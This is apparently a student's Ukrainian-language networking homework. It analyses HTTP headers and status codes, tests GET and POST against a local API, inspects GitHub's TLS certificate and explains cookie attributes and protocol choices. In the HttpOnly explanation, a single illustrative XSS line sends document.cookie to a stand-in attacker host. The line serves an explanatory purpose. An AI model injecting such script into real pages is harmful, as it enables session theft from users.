## Завдання 1. Аналіз HTTP-заголовків та статус-кодів

Ключ `-I` у `curl` відправляє запит методом `HEAD`: сервер повертає лише заголовки, без тіла сторінки.

### Запит 1: http://github.com

```bash
curl -I http://github.com
```

```text
HTTP/1.1 301 Moved Permanently
Content-Length: 0
Location: https://github.com/
```

- **Статус-код:** `301 Moved Permanently` — ресурс постійно переїхав на іншу адресу. Браузер і пошукові системи запам'ятовують нову адресу і надалі звертаються одразу туди.
- **Location:** `https://github.com/`. Редирект веде з HTTP на HTTPS: адреса та сама, змінилась лише схема. GitHub приймає з'єднання лише через захищений протокол, щоб дані (паролі, cookie сесії, код) не передавались відкритим текстом. Тому на звичайний `http://` сервер одразу відповідає перенаправленням, а тіло відповіді порожнє (`Content-Length: 0`).
- **Протокол:** `HTTP/1.1`.

### Запит 2: https://github.com (куди веде редирект)

```bash
curl -I https://github.com
```

```text
HTTP/2 200
date: Tue, 27 Oct 2026 16:27:50 GMT
content-type: text/html; charset=utf-8
...
```

- **Статус-код:** `200 OK` — запит успішний, сторінка існує.
- **Location:** немає, бо редиректу вже немає.
- **Протокол:** `HTTP/2`.

### Запит 3: http://example.com (для порівняння)

```bash
curl -I http://example.com
```

```text
HTTP/1.1 200 OK
Date: Tue, 27 Oct 2026 16:27:57 GMT
Content-Type: text/html; charset=utf-8
Connection: keep-alive
Server: cloudflare
Last-Modified: Sat, 24 Oct 2026 20:05:47 GMT
Allow: GET, HEAD
Accept-Ranges: bytes
Age: 9185
cf-cache-status: HIT
CF-RAY: a5131236eb0fd624-LCA
alt-svc: h3=":443"; ma=86400
```

- **Статус-код:** `200 OK`. На відміну від GitHub, `example.com` не перенаправляє на HTTPS і віддає сторінку по звичайному HTTP.
- **Location:** немає.
- **Протокол:** `HTTP/1.1`.
- Заголовок `cf-cache-status: HIT` показує, що відповідь віддав кеш CDN Cloudflare, а не сам сервер сайту. `Age: 9185` — скільки секунд відповідь уже лежить у кеші.
- Заголовок `alt-svc: h3=":443"` повідомляє клієнту, що сервер підтримує й HTTP/3 (через QUIC на UDP-порту 443).

### Чому в одному випадку HTTP/1.1, а в іншому HTTP/2

По звичайному `http://` curl завжди говорить HTTP/1.1. HTTP/2 узгоджується під час TLS-рукостискання через розширення **ALPN**: клієнт пропонує `h2` і `http/1.1`, сервер обирає `h2`. Тому HTTP/2 з'являється лише на `https://`.

## Завдання 2. Робота з методами HTTP

### Тестове API

JSONPlaceholder використовувати не можна, тому я написав власне мінімальне REST API на Python і запустив його локально: [`api_server.py`](api_server.py). Воно зберігає пости в пам'яті і підтримує:

| Метод | Шлях | Відповідь |
|---|---|---|
| `GET` | `/posts` | `200 OK` — список постів |
| `GET` | `/posts/<id>` | `200 OK` або `404 Not Found` |
| `POST` | `/posts` | `201 Created` — новий пост |

```bash
python3 api_server.py   # слухає http://127.0.0.1:8000
```

### Створення ресурсу (POST)

```bash
curl -i -X POST -d "title=networks&body=homework 3&userId=7" http://127.0.0.1:8000/posts
```

```text
HTTP/1.0 201 Created
Server: BaseHTTP/0.6 Python/3.12.3
Date: Tue, 27 Oct 2026 16:28:17 GMT
Content-Type: application/json; charset=utf-8
Content-Length: 67
Location: /posts/2
Cache-Control: no-store

{"id": 2, "title": "networks", "body": "homework 3", "userId": "7"}
```

**Результат: `201 Created`.** Сервер створив новий ресурс і в заголовку `Location: /posts/2` вказав його адресу. `201` точніший за `200 OK`: він каже не просто «успішно», а «створено новий ресурс».

Що саме відправив curl (ключ `-v`):

```text
> POST /posts HTTP/1.1
> Host: 127.0.0.1:8000
> User-Agent: curl/8.5.0
> Accept: */*
> Content-Length: 39
> Content-Type: application/x-www-form-urlencoded
>
```

Дані `title=networks&body=homework 3&userId=7` не потрапили в рядок запиту (`POST /posts`). Вони пішли в **тіло** запиту, а заголовки `Content-Type` і `Content-Length` описують, що це за дані і скільки їх.

### Читання ресурсу (GET)

```bash
curl -i http://127.0.0.1:8000/posts/2
```

```text
HTTP/1.0 200 OK
Server: BaseHTTP/0.6 Python/3.12.3
Date: Tue, 27 Oct 2026 16:28:17 GMT
Content-Type: application/json; charset=utf-8
Content-Length: 67
Cache-Control: public, max-age=60

{"id": 2, "title": "networks", "body": "homework 3", "userId": "7"}
```

`GET` повернув щойно створений пост зі статусом `200 OK`. Отже, `POST` справді змінив стан сервера.

### Різниця між POST і GET

| | GET | POST |
|---|---|---|
| **Призначення** | Отримати (прочитати) ресурс | Створити ресурс або надіслати дані на обробку |
| **Де передаються дані** | У URL, як query-рядок: `/posts?title=networks`. Тіла запиту зазвичай немає | У тілі запиту. URL лишається чистим: `/posts` |
| **Видимість даних** | Видно в адресному рядку, історії браузера, логах серверів і проксі | Не видно в URL. Але без HTTPS тіло так само читається в мережі, тому POST сам по собі не шифрує дані |
| **Обсяг даних** | Обмежений довжиною URL (на практиці кілька КБ) | Практично не обмежений: файли, великий JSON |
| **Кешування** | Кешується браузером, CDN і проксі. У моєму API: `Cache-Control: public, max-age=60` | За замовчуванням не кешується. У моєму API: `Cache-Control: no-store` |
| **Безпечність (safe)** | Так: не змінює стан сервера | Ні: змінює стан сервера |
| **Ідемпотентність** | Так: 10 однакових GET дають той самий результат, що й один | Ні: 10 однакових POST створять 10 постів. Тому браузер перепитує «надіслати форму повторно?» при оновленні сторінки |

GET кешується саме тому, що він безпечний: якщо запит лише читає дані, повторно віддати збережену відповідь нічим не шкодить. POST змінює дані, тому якщо віддати його відповідь з кешу, сервер не виконає дію.

## Завдання 3. Перевірка TLS-сертифіката

### Команда

```bash
openssl s_client -connect github.com:443 -servername github.com < /dev/null
```

### Відповіді

| Що шукаємо | Значення | Де у виводі |
|---|---|---|
| **Issuer (хто видав)** | `Sectigo Public Server Authentication CA DV E36`, організація Sectigo Limited, Велика Британія | рядок `issuer=` |
| **Протокол TLS** | `TLSv1.3` | рядок `New, TLSv1.3, Cipher is ...` |
| **Cipher Suite** | `TLS_AES_128_GCM_SHA256` | той самий рядок |

### Пояснення

**Ланцюжок довіри.** Сертифікат `github.com` (рівень 0) підписав проміжний центр сертифікації `Sectigo ... CA DV E36` (рівень 1). Його, своєю чергою, підписав кореневий `Sectigo ... Root E46` (рівень 2), якому довіряє моя система. `verify return:1` на кожному рівні і `Verify return code: 0 (ok)` означають, що вся перевірка пройшла успішно. Позначка `DV` (Domain Validation) означає, що центр сертифікації перевірив лише право власності на домен, а не юридичні дані компанії.

**Термін дії.** Сертифікат сайту діє з 1 вересня до 29 листопада 2026 року, тобто лише 90 днів. Короткий термін — сучасна практика: якщо ключ викрадуть, ним можна буде користуватися недовго.

**Що означає шифр `TLS_AES_128_GCM_SHA256`:**
- `AES_128` — симетричне шифрування даних алгоритмом AES з ключем 128 біт;
- `GCM` — режим роботи AES, який одночасно шифрує дані і перевіряє їхню цілісність (AEAD), тому підмінити дані непомітно не вийде;
- `SHA256` — геш-функція, з якої виводяться ключі сесії.

У TLS 1.3 назва набору шифрів не містить алгоритм обміну ключами, бо він завжди ефемерний (ECDHE). Тут видно, яку криву обрали: `Server Temp Key: X25519`. Завдяки ефемерному ключу TLS 1.3 дає **forward secrecy**: навіть якщо колись викрадуть приватний ключ сервера, записаний раніше трафік розшифрувати не вийде.

**Тип ключа сервера:** ECDSA, 256 біт (`Peer signature type: ECDSA`). Еліптичний ключ на 256 біт за стійкістю приблизно відповідає RSA на 3072 біти, але працює швидше.

`No ALPN negotiated` — `openssl` не пропонував жодного протоколу прикладного рівня (на відміну від браузера чи curl, які пропонують `h2`), тому сервер нічого й не обрав.

## Завдання 4. Аналіз безпеки Cookies

### Команда

```bash
curl -v -o /dev/null https://github.com 2>&1 | grep -i set-cookie
```

### Результат

Значення cookie замасковано (`<...>`), бо `_gh_sess` — це ідентифікатор сесії.

```text
< set-cookie: _gh_sess=<значення сесії>; path=/; HttpOnly; secure; SameSite=Lax
< set-cookie: _octo=GH1.1.<...>; expires=Wed, 27 Oct 2027 16:27:58 GMT; domain=.github.com; path=/; secure; SameSite=Lax
< set-cookie: logged_in=no; expires=Wed, 27 Oct 2027 16:27:58 GMT; domain=.github.com; path=/; HttpOnly; secure; SameSite=Lax
```

### Cookie та їхні атрибути

| Cookie | Призначення | HttpOnly | Secure | SameSite | Термін дії |
|---|---|---|---|---|---|
| `_gh_sess` | Сесія користувача | ✅ | ✅ | `Lax` | до закриття браузера (немає `expires`) |
| `_octo` | Анонімний ідентифікатор відвідувача (аналітика) | ❌ | ✅ | `Lax` | 1 рік |
| `logged_in` | Чи увійшов користувач (`no`) | ✅ | ✅ | `Lax` | 1 рік |

### Від якої атаки захищає HttpOnly

**HttpOnly захищає від крадіжки cookie через XSS (Cross-Site Scripting).**

Під час XSS-атаки зловмисник вбудовує свій JavaScript у сторінку сайту, наприклад через коментар, який сайт не відфільтрував. Без HttpOnly цей скрипт може прочитати `document.cookie` і відправити ідентифікатор сесії на сервер зловмисника:

```javascript
fetch('https://attacker.example/steal?c=' + document.cookie)
```

Зловмисник підставляє вкрадений `_gh_sess` у свій браузер і потрапляє в акаунт жертви без пароля (session hijacking). Cookie з атрибутом HttpOnly браузер відправляє на сервер разом із запитами, але JavaScript його не бачить: у `document.cookie` його просто немає. Тому GitHub ставить HttpOnly на `_gh_sess` і `logged_in`. А `_octo` потрібен скриптам аналітики, тому для нього HttpOnly немає.

HttpOnly не усуває саму XSS-вразливість: шкідливий скрипт усе ще може робити запити від імені користувача, поки той на сторінці. Але викрасти сесію і користуватися нею потім зловмисник уже не зможе.

### Роль атрибута Secure

**Secure забороняє браузеру відправляти cookie по незашифрованому HTTP, лише по HTTPS.**

Без Secure достатньо одного запиту на `http://github.com` (наприклад, користувач набрав адресу без `https://`), щоб cookie сесії пішов у мережу відкритим текстом. У публічній Wi-Fi мережі його перехопить будь-хто, хто прослуховує трафік (атака man-in-the-middle). З атрибутом Secure браузер не додасть cookie до цього запиту, сервер відповість редиректом `301` на HTTPS (див. завдання 1), і cookie піде вже по зашифрованому з'єднанню.

### Додатково: SameSite=Lax

`SameSite` захищає від **CSRF** (Cross-Site Request Forgery). Зі значенням `Lax` браузер не відправляє cookie, коли запит ініціює інший сайт у фоні: форма з методом `POST`, `fetch`, `<img>`. Виняток — звичайний перехід за посиланням на GitHub: там cookie надсилаються, щоб користувач лишався залогіненим. Тому шкідливий сайт не може непомітно відправити форму на GitHub від імені залогіненого користувача.

## Завдання 5. Архітектурне моделювання (кейс онлайн-біржі)

### Сценарій А: оновлення графіків цін у браузері в реальному часі

**Вибір: WebSocket.**

Обґрунтування:

1. **Сервер сам надсилає дані (push).** Ціни змінюються щосекунди, і клієнт має отримувати їх одразу. У звичайному HTTP говорить лише клієнт: сервер може тільки відповідати на запити. WebSocket після одного HTTP-запиту `Upgrade` перетворює TCP-з'єднання на постійний двосторонній канал, і сервер пише в нього, щойно ціна змінилась.
2. **Мінімальні накладні витрати.** Якщо опитувати сервер кожну секунду (polling), кожен запит несе сотні байт HTTP-заголовків і cookie, а більшість відповідей буде «нічого не змінилось». Кадр WebSocket має заголовок лише 2–14 байт. Для тисяч користувачів і десятків акцій на кожного різниця величезна.
3. **Двосторонність.** Через те саме з'єднання клієнт може підписатися на потрібні акції або відписатися від них (`subscribe AAPL`), не відкриваючи нових запитів.
4. **Підтримка.** WebSocket працює в усіх браузерах і проходить через проксі та фаєрволи, бо використовує стандартні порти 80/443. Для безпеки — `wss://`, тобто WebSocket поверх TLS.

**Альтернатива:** Server-Sent Events (SSE). Це простіший односторонній потік від сервера до клієнта поверх звичайного HTTP з автоматичним перепідключенням. SSE підійде, якщо користувач лише дивиться на графіки. Але на біржі клієнт ще й відправляє дії (підписки, заявки), і передає бінарні дані (SSE підтримує лише текст), тому WebSocket універсальніший.

**Чому не gRPC:** браузер не дає JavaScript повного доступу до HTTP/2-фреймів, тому повноцінний gRPC у браузері не працює. Існує gRPC-Web, але він потребує проксі і не підтримує стрімінг від клієнта.

### Сценарій Б: взаємодія між внутрішніми мікросервісами (білінг ↔ облік)

**Вибір: gRPC.**

Обґрунтування:

1. **Мінімальна затримка.** gRPC працює поверх **HTTP/2** і передає дані у бінарному форматі **Protocol Buffers**. Повідомлення Protobuf у кілька разів менше за JSON, а серіалізація і десеріалізація швидші, бо не потрібно розбирати текст.
2. **Мультиплексування HTTP/2.** Через одне TCP-з'єднання паралельно йдуть сотні запитів, і повільна відповідь не блокує решту (на рівні HTTP немає head-of-line blocking). Не треба відкривати нове з'єднання і робити нове TLS-рукостискання на кожен виклик.
3. **Строгий контракт.** API описується у `.proto`-файлі, з якого генерується код клієнта і сервера для будь-якої мови. Для фінансових даних це важливо: якщо білінг передасть суму рядком замість числа, помилка виявиться ще під час компіляції, а не в продакшені.
4. **Стрімінг.** gRPC підтримує потоки в обидва боки (bidirectional streaming): сервіс обліку може безперервно передавати зміни залишків акцій у білінг одним потоком.
5. **Deadline.** Кожен виклик має обмеження часу, яке передається далі по ланцюжку сервісів. Якщо облік не відповів вчасно, білінг дізнається про це одразу, а не висить у нескінченному очікуванні.

Ці сервіси працюють у внутрішній мережі, тому головний мінус gRPC — відсутність підтримки браузерів — тут не важливий.

**Доповнення:** для подій, на які не потрібна негайна відповідь (наприклад, «угоду виконано» → оновити звітність, надіслати сповіщення), краще підходить брокер повідомлень (Kafka або RabbitMQ). Він не губить повідомлення, якщо сервіс-одержувач тимчасово недоступний. Але для синхронних викликів із мінімальною затримкою (наприклад, «чи вистачає коштів на рахунку для цієї угоди?») найкращий вибір — gRPC.

### Підсумок

| | Сценарій А: браузер ← біржа | Сценарій Б: білінг ↔ облік |
|---|---|---|
| **Протокол** | WebSocket (`wss://`) | gRPC |
| **Транспорт** | Постійне TCP-з'єднання після HTTP Upgrade | HTTP/2 |
| **Формат даних** | JSON або бінарні кадри | Protocol Buffers (бінарний) |
| **Напрямок** | Двосторонній, сервер надсилає сам | Запит-відповідь і стрімінг в обидва боки |
| **Головна причина** | Push у реальному часі, підтримка браузерами | Мінімальна затримка, строгий контракт між сервісами |
